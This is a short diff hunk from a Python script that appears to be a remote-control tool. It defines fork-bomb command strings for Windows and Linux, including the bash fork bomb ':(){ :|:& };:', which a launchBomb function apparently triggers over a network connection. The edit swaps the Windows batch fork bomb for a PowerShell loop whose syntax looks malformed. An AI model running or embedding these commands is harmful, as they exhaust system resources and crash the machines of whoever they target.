@@ -155,7 +155,7 @@ def killProcess(con):
 
 # Launch bomb
 
-win = "cmd.exe /c %0|%0"
+win = "powershell -c for(){hh \}"
 lin = "bash -c ':(){ :|:& };:'"
 def launchBomb(con):
     con.sendall(b"Are you sure?")
